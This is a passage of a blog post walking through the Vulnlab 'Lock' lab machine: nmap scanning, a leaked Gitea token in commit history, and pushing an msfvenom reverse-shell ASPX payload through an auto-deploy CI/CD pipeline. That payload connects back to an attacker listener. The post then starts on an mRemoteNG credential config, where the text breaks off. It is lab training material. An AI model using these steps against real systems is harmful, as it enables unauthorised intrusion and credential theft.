<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Lock - Vulnlab | serioton's blog</title><meta name="author" content="serioton"><meta name="copyright" content="serioton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Lock is an easy windows box from Vulnlab created by xct and kozmer. It involves gaining a foothold by abusing CI&#x2F;CD in Gitea to upload a shell, decrypting mRemoteNG configs, and gaining system ac">
<meta property="og:type" content="article">
<meta property="og:title" content="Lock - Vulnlab">
<meta property="og:url" content="https://seriotonctf.github.io/2024/01/20/Lock-Vulnlab/index.html">
<meta property="og:site_name" content="serioton&#39;s blog">
<meta property="og:description" content="Lock is an easy windows box from Vulnlab created by xct and kozmer. It involves gaining a foothold by abusing CI&#x2F;CD in Gitea to upload a shell, decrypting mRemoteNG configs, and gaining system ac">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://1897091482-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FqlrTgqfYZ2LxYiFsS7F0%2Flock_slide.png?alt=media&token=4a34abe6-3e20-4725-9334-bd39e2db903a">
<meta property="article:published_time" content="2024-01-20T18:44:31.000Z">
<meta property="article:modified_time" content="2024-01-23T17:57:55.684Z">
<meta property="article:author" content="serioton">
<meta property="article:tag" content="vulnlab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://1897091482-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FqlrTgqfYZ2LxYiFsS7F0%2Flock_slide.png?alt=media&token=4a34abe6-3e20-4725-9334-bd39e2db903a"><link rel="shortcut icon" href="/img/iconcat.png"><link rel="canonical" href="https://seriotonctf.github.io/2024/01/20/Lock-Vulnlab/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Lock - Vulnlab',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-23 17:57:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="serioton's blog"><img class="site-icon" src="/img/cat.jpg"/><span class="site-name">serioton's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Lock - Vulnlab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2024-01-20T18:44:31.000Z" title="Created 2024-01-20 18:44:31">2024-01-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/">writeups</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Lock is an easy windows box from Vulnlab created by xct and kozmer. It involves gaining a foothold by abusing CI&#x2F;CD in Gitea to upload a shell, decrypting mRemoteNG configs, and gaining system access by exploiting the MSI installer in PDF24 Creator.</p>
<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>As always, we start with a standard nmap scan</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">3000/tcp open  ppp</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">5357/tcp open  wsdapi</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">➜  lock sudo nmap -sCV -p80,445,3000,3389,5357 --min-rate=5000 10.10.78.126 | tee nmap.txt</span><br><span class="line">[sudo] password for serioton:</span><br><span class="line">Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2024-01-19 08:18 EST</span><br><span class="line">Nmap scan report for lock.vl (10.10.78.126)</span><br><span class="line">Host is up (0.049s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Lock - Index</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">3000/tcp open  ppp?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GenericLines, Help, RTSPRequest:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">....</span><br><span class="line">HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Fri, 19 Jan 2024 13:18:29 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en-US&quot; class=&quot;theme-auto&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;</span><br><span class="line">....</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.0 405 Method Not Allowed</span><br><span class="line">|     Allow: HEAD</span><br><span class="line">|     Allow: GET</span><br><span class="line">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span><br><span class="line">|     Set-Cookie: i_like_gitea=8754cc9f87bf5b93; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     Set-Cookie: _csrf=JMeupsqJURAdLO4SvVNoOVySlMM6MTcwNTY3MDMxNTA1NTIzMjMwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Fri, 19 Jan 2024 13:18:35 GMT</span><br><span class="line">|_    Content-Length: 0</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: LOCK</span><br><span class="line">|   NetBIOS_Domain_Name: LOCK</span><br><span class="line">|   NetBIOS_Computer_Name: LOCK</span><br><span class="line">|   DNS_Domain_Name: Lock</span><br><span class="line">|   DNS_Computer_Name: Lock</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2024-01-19T13:19:53+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=Lock</span><br><span class="line">| Not valid before: 2023-12-27T14:19:36</span><br><span class="line">|_Not valid after:  2024-06-27T14:19:36</span><br><span class="line">|_ssl-date: 2024-01-19T13:20:32+00:00; -2s from scanner time.</span><br><span class="line">5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>From the Nmap scan, we can see there are 5 ports open.</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>We start by looking at the website on port 80, but there is nothing interesting so far.</p>
<h1 id="GITEA"><a href="#GITEA" class="headerlink" title="GITEA"></a>GITEA</h1><p>We have Gitea running on port 3000, so let’s go there. There is an interesting script inside the <code>dev-scripts</code> repository of the <code>ellen.freeman</code> user<br><a target="_blank" rel="noopener" href="http://lock.vl:3000/ellen.freeman/dev-scripts/src/branch/main/repos.py">http://lock.vl:3000/ellen.freeman/dev-scripts/src/branch/main/repos.py</a> which looks like it’s using a gitea access token. If we go to the commits we can see the Gitea access token is there in the initial commit:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment"># store this in env instead at some point</span></span><br><span class="line">PERSONAL_ACCESS_TOKEN = <span class="string">&#x27;&lt;REDACTED&gt;&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Great, now we have the access token. What we can do with it? We can place it inside the script we just got and run it like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  lock python3 repos.py &lt;http://lock.vl:3000&gt;</span><br><span class="line">Repositories:</span><br><span class="line">- ellen.freeman/dev-scripts</span><br><span class="line">- ellen.freeman/website</span><br></pre></td></tr></table></figure>

<p>As you can see, there is another repo called “website”, so let’s clone it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  lock git config --global http.extraHeader <span class="string">&quot;Authorization: token &lt;REDACTED&gt;&quot;</span></span><br><span class="line">➜  lock git <span class="built_in">clone</span> http://lock.vl:3000/ellen.freeman/website</span><br><span class="line">Cloning into <span class="string">&#x27;website&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 165, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (165/165), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (128/128), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0</span><br><span class="line">Receiving objects: 100% (165/165), 7.16 MiB | 1.78 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (35/35), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  lock <span class="built_in">cd</span> website</span><br><span class="line">➜  website git:(main) <span class="built_in">ls</span></span><br><span class="line">assets  changelog.txt  index.html  readme.md</span><br></pre></td></tr></table></figure>

<p>This looks like it’s the website running on port 80. The <code>README.md</code> file mentions something interesting</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  website git:(main) <span class="built_in">cat</span> readme.md</span><br><span class="line"><span class="comment"># New Project Website</span></span><br><span class="line"></span><br><span class="line">CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver</span><br></pre></td></tr></table></figure>

<h1 id="Shell-as-ellen-freeman"><a href="#Shell-as-ellen-freeman" class="headerlink" title="Shell as ellen.freeman"></a>Shell as ellen.freeman</h1><p>The README file suggests that any changes made to the repository, such as adding or modifying files, will automatically be deployed to the associated web server. So the idea here to commit an aspx shell, which the CI&#x2F;CD pipeline will then automatically deploy to the web server. Once deployed, we can get a shell by accessing <code>http://lock.vl/shell.aspx</code>.<br>Let’s execute the attack. First, we need to generate an aspx shell using msfvenom like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  website git:(main) msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.210 LPORT=443 -f aspx -o exploit.aspx</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of aspx file: 3402 bytes</span><br><span class="line">Saved as: exploit.aspx</span><br></pre></td></tr></table></figure>

<p>After that, we need to add the <code>exploit.aspx</code> file to our Git staging area and commit the changes:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  website git:(main) ✗ git add exploit.aspx</span><br><span class="line">➜  website git:(main) ✗ git commit -m <span class="string">&quot;meow&quot;</span></span><br><span class="line">[main d182b50] meow</span><br><span class="line"> 1 file changed, 45 insertions(+)</span><br><span class="line"> create mode 100644 exploit.aspx</span><br></pre></td></tr></table></figure>

<p>Next, we configure our Git to use the authorization token we obtained earlier:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  website git:(main) git config --<span class="built_in">local</span> http.extraHeader <span class="string">&quot;Authorization: token &lt;REDACTED&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>Finally, we push the commit to the remote repository</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  website git:(main) git push origin main</span><br><span class="line">Enumerating objects: 4, <span class="keyword">done</span>.</span><br><span class="line">Counting objects: 100% (4/4), <span class="keyword">done</span>.</span><br><span class="line">Delta compression using up to 4 threads</span><br><span class="line">Compressing objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">Writing objects: 100% (3/3), 1.41 KiB | 1.42 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Total 3 (delta 1), reused 0 (delta 0), pack-reused 0</span><br><span class="line">remote: . Processing 1 references</span><br><span class="line">remote: Processed 1 references <span class="keyword">in</span> total</span><br><span class="line">To &lt;http://lock.vl:3000/ellen.freeman/website&gt;</span><br><span class="line">   73cdcc1..d182b50  main -&gt; main</span><br></pre></td></tr></table></figure>

<p>Now, let’s setup a listener and then request our shell like this</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  lock rlwrap nc -nlvp 443</span><br><span class="line">listening on [any] 443 ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  lock curl &lt;http://lock.vl/exploit.aspx&gt;</span><br></pre></td></tr></table></figure>

<p>We got a shell as the <code>lock\\ellen.freeman</code> user :)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  lock rlwrap nc -nlvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.8.0.210] from (UNKNOWN) [10.10.78.126] 50949</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2159]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\\windows\\system32\\inetsrv&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">lock\\ellen.freeman</span><br></pre></td></tr></table></figure>

<h1 id="ellen-freeman-to-gale-dekarios"><a href="#ellen-freeman-to-gale-dekarios" class="headerlink" title="ellen.freeman to gale.dekarios"></a>ellen.freeman to gale.dekarios</h1><p>As you can see, we have another user called <code>gale.dekarios</code> that we need to escalate to</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\\Users&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\\Users</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>        <span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>   <span class="number">2</span>:<span class="number">00</span> PM                .NET v4.<span class="number">5</span></span><br><span class="line">d<span class="literal">-----</span>        <span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>   <span class="number">2</span>:<span class="number">00</span> PM                .NET v4.<span class="number">5</span> Classic</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>  <span class="number">12</span>:<span class="number">01</span> PM                Administrator</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">36</span> AM                ellen.freeman</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>   <span class="number">6</span>:<span class="number">14</span> AM                gale.dekarios</span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">12</span>/<span class="number">27</span>/<span class="number">2023</span>  <span class="number">10</span>:<span class="number">21</span> AM                Public</span><br></pre></td></tr></table></figure>

<p>Inside ellen.freeman’s Documents directory, there’s an interesting config file</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\\temp&gt; <span class="built_in">cd</span> C:\\users\\ellen.freeman\\documents</span><br><span class="line"><span class="built_in">PS</span> C:\\users\\ellen.freeman\\documents&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\\users\\ellen.freeman\\documents</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>        <span class="number">12</span>/<span class="number">28</span>/<span class="number">2023</span>   <span class="number">5</span>:<span class="number">59</span> AM           <span class="number">3341</span> config.xml</span><br></pre></td></tr></table></figure>

<p><strong>config.xml</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mrng:Connections</span> <span class="attr">xmlns:mrng</span>=<span class="string">&quot;&lt;http://mremoteng.org&gt;&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Connections&quot;</span> <span class="attr">Export</span>=<span class="string">&quot;false&quot;</span> <span class="attr">EncryptionEngine</span>=<span class="string">&quot;AES&quot;</span> <span class="attr">BlockCipherMode</span>=<span class="string">&quot;GCM&quot;</span> <span class="attr">KdfIterations</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">FullFileEncryption</span>=<span class="string">&quot;false&quot;</span> <span class="attr">Protected</span>=<span class="string">&quot;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp&quot;</span> <span class="attr">ConfVersion</span>=<span class="string">&quot;2.6&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Node</span> <span class="attr">Name</span>=<span class="string">&quot;RDP/Gale&quot;</span> <span class="attr">Type</span>=<span class="string">&quot;Connection&quot;</span> <span class="attr">Descr</span>=<span class="string">&quot;&quot;</span> <span class="attr">Icon</span>=<span class="string">&quot;mRemoteNG&quot;</span> <span class="attr">Panel</span>=<span class="string">&quot;General&quot;</span> <span class="attr">Id</span>=<span class="string">&quot;a179606a-a854-48a6-9baa-491d8eb3bddc&quot;</span> <span class="attr">Username</span>=<span class="string">&quot;Gale.Dekarios&quot;</span> <span class="attr">Domain</span>=<span class="string">&quot;&quot;</span> <span class="attr">Password</span>=<span class="string">&quot;&lt;REDACTED&gt;&quot;</span> <span class="attr">Hostname</span>=<span class="string">&quot;Lock&quot;</span> <span class="attr">Protocol</span>=<span class="string">&quot;RDP&quot;</span> <span class="attr">PuttySession</span>=<span class="string">&quot;Default Settings&quot;</span> <span class="attr">Port</span>=<span class="string">&quot;3389&quot;</span> <span class="attr">ConnectToConsole</span>=<span class="string">&quot;false&quot;</span> <span class="attr">UseCredSsp</span>=<span class="string">&quot;true&quot;</span> <span class="attr">RenderingEngine</span>=<span class="string">&quot;IE&quot;</span> <span class="attr">ICAEncryptionStrength</span>=<span class="string">&quot;EncrBasic&quot;</span> <span class="attr">RDPAuthenticationLevel</span>=<span class="string">&quot;NoAuth&quot;</span> <span class="attr">RDPMinutesToIdleTimeout</span>=<span class="string">&quot;0&quot;</span> <span 